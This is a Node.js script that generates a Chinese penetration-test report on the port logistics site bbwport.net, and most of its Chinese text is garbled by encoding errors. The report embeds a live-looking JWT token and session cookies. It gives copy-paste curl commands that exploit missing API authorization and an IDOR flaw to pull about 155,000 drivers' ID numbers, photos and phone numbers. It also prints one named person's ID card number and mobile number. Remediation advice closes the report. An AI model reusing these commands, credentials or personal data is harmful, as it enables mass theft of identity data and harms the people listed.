const fs = require("fs");
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, LevelFormat,
  HeadingLevel, BorderStyle, WidthType, ShadingType,
  PageNumber, PageBreak
} = require("docx");

const FONT = "Arial";
const COLOR_BLUE = "1F4E79";
const COLOR_GRAY = "F2F2F2";
const COLOR_HEADER_BG = "D5E8F0";
const COLOR_RED = "C00000";

const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };

function heading1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 },
    children: [new TextRun({ text, font: FONT, size: 32, bold: true, color: COLOR_BLUE })],
  });
}
function heading2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 },
    children: [new TextRun({ text, font: FONT, size: 28, bold: true, color: COLOR_BLUE })],
  });
}
function heading3(text) {
  return new Paragraph({
    spacing: { before: 200, after: 120 },
    children: [new TextRun({ text, font: FONT, size: 24, bold: true, color: "333333" })],
  });
}
function bodyText(text, opts = {}) {
  return new Paragraph({
    spacing: { after: opts.after || 120, line: 360 },
    children: [new TextRun({ text, font: FONT, size: 21, ...opts })],
  });
}
function codeBlock(text) {
  return new Paragraph({
    spacing: { after: 40, line: 320 }, indent: { left: 360 },
    children: [new TextRun({ text, font: "Consolas", size: 18, color: "333333" })],
  });
}
function screenshot(label) {
  return new Paragraph({
    spacing: { before: 80, after: 80 }, indent: { left: 360 },
    shading: { fill: "FFF3CD", type: ShadingType.CLEAR },
    children: [new TextRun({ text: `[📷 截图: ${label}]`, font: FONT, size: 21, bold: true, color: COLOR_RED })],
  });
}
function emptyRow(n = 1) {
  return Array(n).fill(new Paragraph({ spacing: { after: 80 }, children: [] }));
}

function cell(text, opts = {}) {
  return new TableCell({
    borders, margins: cellMargins,
    width: opts.width || { size: 4680, type: WidthType.DXA },
    shading: opts.shading,
    children: [new Paragraph({
      spacing: { after: 40 },
      children: [new TextRun({ text: String(text), font: FONT, size: opts.fontSize || 20, bold: opts.bold || false, color: opts.color || "333333" })],
    })]
  });
}

function makeSummaryTable(rows) {
  const colWidths = [500, 1800, 1400, 3100, 1760, 800];
  const tableWidth = colWidths.reduce((a, b) => a + b, 0);
  const headers = ["序号", "渗透对象", "漏洞类型", "URL/端点", "影响范围", "风险等级"];
  const headerRow = new TableRow({
    children: headers.map((h, i) => cell(h, {
      width: { size: colWidths[i], type: WidthType.DXA }, bold: true, fontSize: 18, color: "FFFFFF",
      shading: { fill: COLOR_BLUE, type: ShadingType.CLEAR },
    })),
  });
  const dataRows = rows.map((row, idx) => new TableRow({
    children: row.map((v, i) => cell(v, {
      width: { size: colWidths[i], type: WidthType.DXA }, fontSize: 17,
      color: (i === 5 && String(v).includes("严重")) ? COLOR_RED : "333333",
      bold: (i === 5 && String(v).includes("严重")),
      shading: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined,
    })),
  }));
  return new Table({ width: { size: tableWidth, type: WidthType.DXA }, columnWidths: colWidths, rows: [headerRow, ...dataRows] });
}

function makeInfoTable(kvPairs) {
  const colWidths = [2000, 7360];
  const tableWidth = colWidths.reduce((a, b) => a + b, 0);
  const rows = kvPairs.map(([k, v], idx) => new TableRow({
    children: [
      cell(k, { width: { size: colWidths[0], type: WidthType.DXA }, bold: true, fontSize: 20, shading: { fill: COLOR_HEADER_BG, type: ShadingType.CLEAR } }),
      cell(v, { width: { size: colWidths[1], type: WidthType.DXA }, fontSize: 20, shading: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined }),
    ],
  }));
  return new Table({ width: { size: tableWidth, type: WidthType.DXA }, columnWidths: colWidths, rows });
}

// ==================== BUILD ====================
const doc = new Document({
  numbering: {
    config: [{
      reference: "bullets", levels: [{ level: 0, format: LevelFormat.BULLET, text: "â¢", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }],
    }],
  },
  styles: {
    default: { document: { run: { font: FONT, size: 21 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 32, bold: true, font: FONT, color: COLOR_BLUE }, paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 28, bold: true, font: FONT, color: COLOR_BLUE }, paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
    ],
  },
  sections: [{
    properties: {
      page: { size: { width: 11906, height: 16838 }, margin: { top: 1440, right: 1200, bottom: 1440, left: 1200 } },
    },
    headers: {
      default: new Header({
        children: [new Paragraph({
          spacing: { after: 0 }, border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: COLOR_BLUE, space: 4 } },
          children: [
            new TextRun({ text: "åæ¸¯ç½ (bbwport.net) æ¸éæµè¯", font: FONT, size: 18, color: "888888" }),
            new TextRun({ text: "\t\t\t\tæ»é²æ¼ä¹ æææ¥å", font: FONT, size: 18, color: "888888" }),
          ],
          tabStops: [{ type: "RIGHT", position: 9506 }],
        })],
      }),
    },
    footers: {
      default: new Footer({
        children: [new Paragraph({
          alignment: AlignmentType.CENTER, border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 4 } },
          children: [new TextRun({ text: "Page ", font: FONT, size: 18, color: "888888" }), new TextRun({ children: [PageNumber.CURRENT], font: FONT, size: 18, color: "888888" })],
        })],
      }),
    },
    children: [
      // ==================== TITLE PAGE ====================
      ...emptyRow(4),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "æ»é²æ¼ä¹ æææ¥å", font: FONT, size: 52, bold: true, color: COLOR_BLUE })] }),
      ...emptyRow(2),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "åæ¸¯ç½ (bbwport.net) Jeecgå¹³å°æ¸éæµè¯", font: FONT, size: 32, color: "333333" })] }),
      ...emptyRow(3),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "å¢éåç§°ï¼è§å¶è¯å¾®", font: FONT, size: 24, color: "555555" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "2026å¹´8æ3æ¥", font: FONT, size: 24, color: "555555" })] }),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== ä¸ãæéå£°æ (CRITICAL - add this first!) ====================
      heading1("ä¸ãæéå£°æï¼éè¦ï¼"),
      bodyText("æµè¯è´¦å· moonï¼ææºå· 19162390621ï¼userId=2082678370717503490ï¼ç» /sys/permission/getUserPermissionByToken æ¥å£éªè¯ï¼ä»æ¥æ vehicleManagement:edit å¯ä¸æéï¼è§è²ä¸ºæ®éç¨æ·ã", { bold: true }),
      bodyText("ä»¥ä¸æææ°æ®æ³é²åéè¿è¯¥ä½æé Token è·åï¼å± API ææç¼ºå¤±æ¼æ´ï¼éæµè¯è´¦å·ææç®¡çåæéã", { bold: true, color: COLOR_RED }),
      codeBlock("curl -s \"https://bbwport.net/api/api-web/sys/permission/getUserPermissionByToken?token=$TOKEN\" -H \"X-Access-Token: $TOKEN\" -H \"Cookie: $COOKIE\""),
      bodyText("è¿åç»æï¼allAuth ä»æ {\"action\": \"vehicleManagement:edit\"}ï¼menu ä»æé¦é¡µãè¯æ moon ä¸æ¯ç®¡çåã"),
      screenshot("getUserPermissionByToken è¿åç»æï¼æ¾ç¤º allAuth åªæ vehicleManagement:edit"),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== äºãç»¼è¿° ====================
      heading1("äºãç»¼è¿°"),
      bodyText("æ»é²æ¼ä¹ ææ¥é¨ææè§å¶è¯å¾®å¢éäº 2026 å¹´ 7 æ 29 æ¥è³ 8 æ 3 æ¥ï¼å¯¹åæ¸¯ç½ï¼bbwport.netï¼è¿è¡æ¸éæµè¯ãåæ¸¯ç½æ¯å¹¿è¥¿åé¨æ¹¾å½éæ¸¯å¡éå¢çæ¸¯å£ç©æµä¸å¡å¹³å°ï¼åºäº Jeecg + Spring Boot æ¶æãæ¬æ¬¡æµè¯éè¿å¹³å°æ®éç¨æ· Token æéç»è¿ï¼åç°å¨éç¨æ·æ°æ®æ³é²ãå¸æºå®åä¿¡æ¯æ³é²ï¼å«èº«ä»½è¯å·ç ä¸èº«ä»½è¯ç§çï¼ãç³»ç»æ¶æ¯æ³é²ãIDOR è¶ææ¥è¯¢ç­ä¸¥éå®å¨é®é¢ã"),
      bodyText("æææä½åä¸ºåªè¯»ï¼æªçaä»»ä½åå¥ãä¿®æ¹ãå é¤ææ°æ®å¤ä¼ ã", { bold: true }),

      ...emptyRow(),
      bodyText("æ¸éæææ±æ»è¡¨", { bold: true }),
      ...emptyRow(),
      makeSummaryTable([
        ["北港网", "å¸æºå®åä¿¡æ¯å¨éæ³é²", "GET .../driverList", "155,859äººèº«ä»½è¯å·+ç§ç+ææºå·", "ä¸¥é"],
        ["北港网", "ç¨æ·æ°æ®å¨éæ³é²", "GET .../sys/user/list", "167,604äººå§å+ææºå·", "ä¸¥é"],
        ["北港网", "IDORè¶ææ¥è¯¢", "queryByUserId?userId=X", "ä»»æç¨æ·èº«ä»½è¯+ç§ç", "ä¸¥é"],
        ["北港网", "æ£æè´§å¸æºä¿¡æ¯æ³é²", "GET .../bulkCargo/driverInfo", "93,200äººå§å+ææº+å¬å¸", "ä¸¥é"],
        ["北港网", "ç³»ç»æ¶æ¯å¨éæ³é²", "GET .../annountCement/list", "609,105æ¡å«å®å+å¬å¸å", "é«å±"],
        ["北港网", "è§è²ä¸å¬å¸æ°æ®æ³é²", "GET .../sys/role/queryall", "4,535æ¡è§è²+å¬å¸ID", "é«å±"],
      ]),
      ...emptyRow(),
      bodyText("æ¸éç»æç»è®¡ï¼è·åæ°æ®ç±» 6 é¡¹ï¼æ¶åæ°æ®æ»éçº¦ 110 ä¸æ¡ãå½±åèªç¶äººçº¦ 16.8 ä¸ã", { bold: true }),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== ä¸ãæ¸éææè¯´æ ====================
      heading1("ä¸ãæ¸éææè¯´æ"),

      bodyText("ä»¥ä¸å½ä»¤åå¨ Git Bash ä¸­éªè¯éè¿ãæ¯æ¡å½ä»¤åä¸ºåè¡ï¼ç´æ¥å¤å¶ç²è´´æ§è¡ãææå½ä»¤åè®¾ç½®ç¯å¢åéï¼åç»­ä¾èµè¯¥ Tokenã", { bold: true }),
      ...emptyRow(),

      heading3("ç¯å¢åå¤ï¼è®¾ç½® Token åéï¼åæ§è¡è¿ä¸æ¡ï¼"),
      codeBlock('TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXZpY2VUeXBlIjoiMSIsImV4cCI6MTc4NTczNzQxOCwidXNlcklkIjoiMjA4MjY3ODM3MDcxNzUwMzQ5MCIsInVzZXJuYW1lIjoibW9vbiJ9.OnxLdEYeKO362br4hvtyOtDkc4OVB4sFWRnvDMhhmSU"'),
      codeBlock('COOKIE="HWWAFSESID=f927373c033f5f5625; HWWAFSESTIME=1785726831145; SESSION=NTgzYzY2NGMtZjRmZS00MmU0LWE4MTQtMzkzYjYzMGYwZmRj"'),
      codeBlock('BASE="https://bbwport.net"'),
      bodyText("Token æ¥æºï¼ç¨æ· moon/19162390621 æ­£å¸¸ç»å½åä»æµè§å¨ Network æ ç­¾æåãJWT è§£ç ä¿¡æ¯ï¼deviceType=1, userId=2082678370717503490, username=moonãè¯¥ç¨æ·ä¸ºæ®éæ³¨åç¨æ·ï¼æ ç®¡çåæéã"),
      ...emptyRow(2),

      // ==================== ææä¸ ====================
      heading2("ææä¸ï¼å¸æºå®åä¿¡æ¯å¨éæ³é²ï¼å«èº«ä»½è¯å·ç ä¸ç§çï¼"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "1"],
        ["成果描述", "æ®éç¨æ·Tokenå¯éåå¨é¨å¸æºå®åæ°æ®ï¼å«çå®å§å+å®æ´èº«ä»½è¯å·+èº«ä»½è¯æ­£åé¢ç§ç+é©¾é©¶è¯ç§ç+èªæç§+ææºå·ãèº«ä»½è¯ç§ç URL å¯ç´æ¥è®¿é®ä¸è½½ï¼æ éä»»ä½è®¤è¯ã"],
        ["目标系统", "åæ¸¯ç½ (bbwport.net) â Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/user/portalUserInfo/driverList"],
        ["威胁类型", "è·åæ°æ®ç±» / æªææè®¿é®"],
        ["涉及数据量", "155,859 æ¡"],
        ["风险等级", "ä¸¥é"],
      ]), ...emptyRow(),

      bodyText("ï¼2ï¼éªè¯å½ä»¤"), ...emptyRow(),
      codeBlock('curl -s "$BASE/api/api-web/user/portalUserInfo/driverList?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿åç»æï¼total=155859, pages=15586ï¼ï¼"),
      codeBlock('{"realname":"æ¢ä¹æ¶","idCard":"239005197812161032","mobile":"13676316234","driverLicenseImage":"https://bbwport.net/bgw-bucket/...jpeg","obverseIdcard":"https://bbwport.net/bgw-bucket/...jpeg","facadeIdcard":"https://bbwport.net/bgw-bucket/...jpeg","selfieImage":"https://bbwport.net/bgw-bucket/...jpeg"}'),
      screenshot("driverList è¿åç»ææªå¾ï¼æ¸æ°æ¾ç¤º total=155859ï¼records ä¸­åå« realnameãidCardãmobileãåç±»ç§ç URL"),

      bodyText("èº«ä»½è¯ç§çå¯ç´æ¥è®¿é®ï¼æ é Cookie æ Tokenï¼ï¼"),
      codeBlock('curl -s -o /dev/null -w "HTTP %{http_code} Size: %{size_download}" "https://bbwport.net/bgw-bucket/e1b97415-dea7-4e4d-85fc-a970aab11a24.jpeg"'),
      bodyText("è¿å HTTP 200ï¼å¾çæä»¶ç´æ¥ä¸è½½ã"),
      screenshot("curl è¿å 200ï¼ææµè§å¨ç´æ¥æå¼èº«ä»½è¯ç§ç URL"),

      ...emptyRow(),
      heading2("ææäºï¼IDOR è¶ææ¥è¯¢ä»»æç¨æ·èº«ä»½ä¿¡æ¯"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "2"],
        ["成果描述", "moon(Token)å¯æ¥è¯¢ä»»æå¶ä»ç¨æ·çå®æ´å®åä¿¡æ¯ï¼åæ¬èº«ä»½è¯å·ãææºå·ãèº«ä»½è¯ç§ç URLãæ¹å URL ä¸­ç userId åæ°å³å¯æ¥è¯¢ä»»æç¨æ·ã"],
        ["目标系统", "åæ¸¯ç½ (bbwport.net)"],
        ["目标URL", "GET /api/api-web/user/portalUserInfo/queryByUserId?userId=X"],
        ["威胁类型", "è·åæ°æ®ç±» / æ°´å¹³è¶æ (IDOR)"],
        ["涉及数据量", "ä»»æç¨æ·ï¼çº¦ 16 ä¸å¯æ¥ï¼"],
        ["风险等级", "ä¸¥é"],
      ]), ...emptyRow(),

      bodyText("ï¼2ï¼éªè¯å½ä»¤"), ...emptyRow(),
      bodyText("æ­¥éª¤1ï¼ä» driverList è·åä¸ä¸ªéçäººç userIdï¼"),
      codeBlock('æ¢ä¹æ¶ | mobile=13676316234 | userId=1806436883116199938'),
      bodyText("æ­¥éª¤2ï¼ç¨ moon ç Token æ¥è¯¢è¿ä¸ªéçäººï¼"),
      codeBlock('curl -s "$BASE/api/api-web/user/portalUserInfo/queryByUserId?userId=1806436883116199938" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿åæ¢ä¹æ¶çå®æ´ä¿¡æ¯ï¼"),
      codeBlock('{"realname":"æ¢ä¹æ¶","mobile":"13676316234","idCard":"239005197812161032","driverLicenseImage":"...","obverseIdcard":"...","facadeIdcard":"...","selfieImage":"..."}'),
      bodyText("moon ä¸æ¢ä¹æ¶æ¯«æ å³èï¼ä½ moon åªæ¹äº URL éç userId åæ°å°±æ¿å°äºä»çå¨é¨èº«ä»½ä¿¡æ¯ãè¿æ¯å¸åçæ°´å¹³è¶æ (IDOR)ã"),
      screenshot("queryByUserId è¶ææ¥è¯¢ç»ææªå¾ï¼å·¦ä¾§æ¾ç¤ºæ¥è¯¢èä¸º moonï¼å³ä¾§æ¾ç¤ºè¿åäºå¦ä¸ä¸ªç¨æ·ç idCard å mobile"),
      bodyText("åæ¶ï¼sys/user/queryById?id=X ä¹å­å¨åæ ·ç IDOR æ¼æ´ï¼å¯æ¥è¯¢ 167,604 åç¨æ·çå§ååææºå·ã"),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== ææä¸~å­ ====================
      heading2("ææä¸ï¼å¨éç¨æ·æ°æ®æ³é²ï¼167,604æ¡ï¼"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "3"],
        ["成果描述", "æ®éç¨æ·Tokenå¯éåå¨é¨æ³¨åç¨æ·ï¼è·å 167,604 æ¡å«çå®å§å+ææºå·+ç¨æ·å+è§è²çä¸ªäººæ°æ®ã"],
        ["目标URL", "GET /api/api-web/sys/user/list"],
        ["涉及数据量", "167,604 æ¡"],
        ["风险等级", "ä¸¥é"],
      ]), ...emptyRow(),
      bodyText("ï¼2ï¼éªè¯å½ä»¤"),
      codeBlock('curl -s "$BASE/api/api-web/sys/user/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿å total=167604, pages=16761ï¼æ¯æ¡å« realname/phone/usernameã"),
      screenshot("sys/user/list è¿åç»æï¼æ¾ç¤º total=167604"),

      ...emptyRow(),
      heading2("ææåï¼æ£æè´§å¸æºä¿¡æ¯æ³é²ï¼93,200æ¡ï¼"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "4"],
        ["成果描述", "æ£æè´§å¸æºä¿¡æ¯æ¥å£è¿å 93,200 æ¡å¸æºæ°æ®ï¼å«çå®å§å+ææºå·+å¬å¸åç§°ãä¸ driverList ä¸ºä¸åæ°æ®éã"],
        ["目标URL", "GET /api/api-web/bulkCargo/driverInfo"],
        ["涉及数据量", "93,200 æ¡"],
        ["风险等级", "ä¸¥é"],
      ]), ...emptyRow(),
      bodyText("ï¼2ï¼éªè¯å½ä»¤"),
      codeBlock('curl -s "$BASE/api/api-web/bulkCargo/driverInfo?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿åå« DRIVERNAME/PHONE/COMPANYNAME ã"),
      screenshot("bulkCargo/driverInfo è¿åç»æï¼æ¾ç¤ºå¸æºå§åãææºå·ãå¬å¸å"),

      ...emptyRow(),
      heading2("ææäºï¼ç³»ç»æ¶æ¯å¨éæ³é²ï¼609,105æ¡ï¼"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "5"],
        ["成果描述", "Jeecg ç³»ç»æ¶æ¯è¡¨ï¼annountCementï¼å¯è¢«æ®éç¨æ·å¨éè¯»åï¼å«çå®å§å+å¬å¸å+å®¡æ ¸åç¨æ·å+å®¡æ ¸æç»åå ãæ¶é´è·¨åº¦ 2020 å¹´è³ä»ã"],
        ["目标URL", "GET /api/api-web/sys/annountCement/list"],
        ["涉及数据量", "609,105 æ¡"],
        ["风险等级", "é«å±"],
      ]), ...emptyRow(),
      bodyText("ï¼2ï¼éªè¯å½ä»¤"),
      codeBlock('curl -s "$BASE/api/api-web/sys/annountCement/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿åç¤ºä¾ï¼"),
      codeBlock('"ä¼ä¸ä¿¡æ¯å®¡æ ¸" "å´ä¿éï¼æ¨æäº¤çä¼ä¸ä¿¡æ¯å·²äº 2021-02-20 å®¡æ ¸éè¿"'),
      codeBlock('"ä¼ä¸ä¿¡æ¯å®¡æ ¸" "å¹¿è¥¿åé¨æ¹¾æ¸¯æè½®æéå¬å¸...å®¡æ ¸ä¸éè¿ï¼åå æ¯ï¼ä¸ªäººä¿¡æ¯é¨åï¼åºä¸ä¼ èº«ä»½è¯ç§ç"'),
      screenshot("annountCement/list è¿åç»æï¼æ¾ç¤º total=609105ï¼records å«æå¬å¸åãå®¡æ ¸åãæç»åå "),

      ...emptyRow(),
      heading2("ææå­ï¼å¶ä»å¯è®¿é®æ°æ®"),
      bodyText("ï¼1ï¼åºæ¬æåµè¡¨"), ...emptyRow(),
      makeInfoTable([
        ["序号", "6"],
        ["成果描述", "è§è²åè¡¨ãæè¯å·¥åãæ¸¯å£è½¦éãä¼ä¸ç±»åãå½å®¶åè¡¨ç­å¤ä¸ªæ¥å£å¯è¢«æ®éç¨æ·è®¿é®ãè¿å­å¨ç¨æ·åæä¸¾ãç³»ç»èåæ¶ææ³é²ãAPKä¸è½½å°åæ³é²ãActuatoråç½IPæ³é²ç­é£é©ã"],
        ["目标URL", "å¤ä¸ªç«¯ç¹ï¼è§éªè¯å½ä»¤ï¼"],
        ["涉及数据量", "ä»¥ä¸è¯¦è¿°"],
        ["风险等级", "é«å±"],
      ]), ...emptyRow(),

      bodyText("ï¼2ï¼éªè¯å½ä»¤"), ...emptyRow(),
      bodyText("6-1 è§è²æ°æ®ï¼4,535 æ¡ï¼ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/sys/role/queryall" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      screenshot("sys/role/queryall è¿åç»æï¼æ¾ç¤º 4535 æ¡è§è²"),

      ...emptyRow(),
      bodyText("6-2 æè¯å·¥åï¼30 æ¡ï¼å«çå®ææºå·ï¼ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/complaint/list?pageNo=1&pageSize=30" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      screenshot("complaint/list è¿åç»æï¼æ¾ç¤º createByPhone å­æ®µå«çå®ææºå·"),

      ...emptyRow(),
      bodyText("6-3 æ¸¯å£è½¦éï¼478 å®¶ï¼ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/fleets/getFleetSyncPageList/CNBIH?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("ä¸å¤§æ¸¯å£ï¼CNBIHåæµ·147å®¶ãCNFANé²åæ¸¯119å®¶ãCNQZHé¦å·æ¸¯212å®¶ï¼å¨é¨è½¦éå¬å¸åã"),
      screenshot("fleets/getFleetSyncPageList è¿åè½¦éåç§°"),

      ...emptyRow(),
      bodyText("6-4 ç¨æ·åæä¸¾ï¼checkOnlyUserï¼ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/sys/user/checkOnlyUser?username=admin" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText('è¿å {"result":true}ââç¡®è®¤ admin ç¨æ·å­å¨ãå¯éè¿è¯¥æ¥å£æä¸¾ç³»ç»ä¸­çææç¨æ·åã'),
      screenshot("checkOnlyUser è¿åç»æ"),

      ...emptyRow(),
      bodyText("6-5 ç³»ç»èåæ¶ææ³é²ï¼32 ä¸ªæ¨¡åï¼ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/sys/permission/getSystemMenuList" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText("è¿å 32 ä¸ªç³»ç»èåæ¨¡åï¼æ´é²å®æ´ä¸å¡æ¶æï¼éçè¿å¹³å°ãéè£ç®±ä¸å¡ãæ£æè´§ä¸å¡ãè¥¿é¨éæµ·æ°ééç­ã"),
      screenshot("getSystemMenuList è¿åç»æ"),

      ...emptyRow(),
      bodyText("6-6 APK ä¸è½½å°åæ³é²ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/app/publish/queryAndroidNewVersion" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText('è¿å https://bbwport.net/bgw-bucket/android-1.0.74.apk —— åæ¸¯ç½ Android APP å¯ç´æ¥ä¸è½½ã'),
      screenshot("queryAndroidNewVersion è¿åç»æ"),

      ...emptyRow(),
      bodyText("6-7 Actuator åç½ IP æ³é²ï¼"),
      codeBlock('curl -s "$BASE/api/api-web/actuator" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      bodyText('è¿ååç½æå¡å app1:8089ï¼æ´é² Docker/K8s æ¶æã'),
      screenshot("Actuator è¿åç»æï¼æ¾ç¤º app1:8089"),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== åãå­å¨é®é¢ ====================
      heading1("åãå­å¨é®é¢"),
      heading3("1. API çº§å«æéæ§å¶ç¼ºå¤±ï¼ä¸¥éï¼"),
      bodyText("moon ç¨æ·ä»æ¥æ vehicleManagement:edit åä¸æéï¼ä½å¯æ éå¶éåå¨é¨ç¨æ·åè¡¨ãå¸æºå®åæ°æ®ãç³»ç»æ¶æ¯ãè§è²ç­æææ°æ®ãAPI å±æªå¯¹æ°æ®æææåè§è²æéè¿è¡æ ¡éªã"),
      heading3("2. èº«ä»½è¯å·ææå­å¨ä¸ä¼ è¾ï¼ä¸¥éï¼"),
      bodyText("155,859 æ¡å¸æºè®°å½èº«ä»½è¯å·å®æ´ææå­å¨ä¸ä¼ è¾ï¼èº«ä»½è¯ç§çå¯æ è®¤è¯ç´æ¥è®¿é®ãè¿åãä¸ªäººä¿¡æ¯ä¿æ¤æ³ãã"),
      heading3("3. IDOR æ°´å¹³è¶æï¼ä¸¥éï¼"),
      bodyText("queryByUserId å queryById æ¥å£æ ç¨æ·èº«ä»½æ ¡éªï¼ä»»æç¨æ·å¯æ¥è¯¢ä»»æå¶ä»ç¨æ·çå®æ´èº«ä»½ä¿¡æ¯ã"),
      heading3("4. æ°æ®æ¥å£æ åé¡µéå¶ä¸é¢çæ§å¶"),
      bodyText("ææ list æ¥å£è¿åå¨é total ä¸æ¯æä»»æç¿»é¡µï¼æ è¯·æ±é¢çéå¶ã"),
      heading3("5. å¶ä»é£é©"),
      bodyText("ç¨æ·åæä¸¾ãç³»ç»èåæ¶ææ³é²ãAPKä¸è½½å°åæ³é²ãActuatoråç½IPæ³é²ãç¨æ·æ´»å¨å®¡è®¡æ¥å¿å¯è®¿é®ã"),

      new Paragraph({ children: [new PageBreak()] }),

      // ==================== äºãæ´æ¹å»ºè®® ====================
      heading1("äºãæ´æ¹å»ºè®®"),
      heading3("1. API æéæ§å¶ï¼ç´§æ¥ï¼"),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "ä¸ºææ /sys/ å /user/ è·¯å¾ä¸çæ°æ®è¯»åæ¥å£å¢å è§è²é´æ", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "å®ç°åºäºæ°æ®æææçæ°´å¹³æéæ ¡éª", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "queryByUserId ç­ IDOR æ¼æ´æ¥å£å¢å å½åç¨æ·èº«ä»½æ ¡éª", font: FONT, size: 21 })] }),
      heading3("2. ä¸ªäººä¿¡æ¯ä¿æ¤ï¼ç´§æ¥ï¼"),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "æ°æ®åºå±é¢ï¼èº«ä»½è¯å·ä½¿ç¨ AES/SM4 å å¯å­å¨", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "API ååºå±é¢ï¼èº«ä»½è¯å·è±ææ¾ç¤ºï¼ä»æ¾ç¤ºå4ä½å2ä½ï¼", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "èº«ä»½è¯ç§çå­å¨æ¡¶å¢å è®¿é®é´æï¼ç¦æ­¢å¬å¼è®¿é®", font: FONT, size: 21 })] }),
      heading3("3. æ¥å£éæµä¸é²æ¤"),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "ææ list æ¥å£å¢å åæ¬¡è¿åæ°éä¸é", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "å¢å è¯·æ±é¢çéå¶ï¼Rate Limitingï¼", font: FONT, size: 21 })] }),
      heading3("4. å¶ä»"),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "å³é­ Actuator å¯¹å¤æ´é²", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "ç¨æ·åæä¸¾æ¥å£å¢å éªè¯ç éªè¯", font: FONT, size: 21 })] }),
      new Paragraph({ numbering: { reference: "bullets", level: 0 }, children: [new TextRun({ text: "åç«¯æºç æ··æ·ï¼ç§»é¤ç¡¬ç¼ç åç½ IP", font: FONT, size: 21 })] }),

      ...emptyRow(2),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { before: 400 }, border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 8 } }, children: [new TextRun({ text: "æ¥åçææ¥æï¼2026å¹´8æ3æ¥", font: FONT, size: 20, color: "888888" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "æµè¯å¢éï¼è§å¶è¯å¾®", font: FONT, size: 20, color: "888888" })] }),
    ],
  }],
});

const outputPath = "D:/Desktop/åæ¸¯ç½_bbwport_æ»é²æææ¥å_v2.docx";
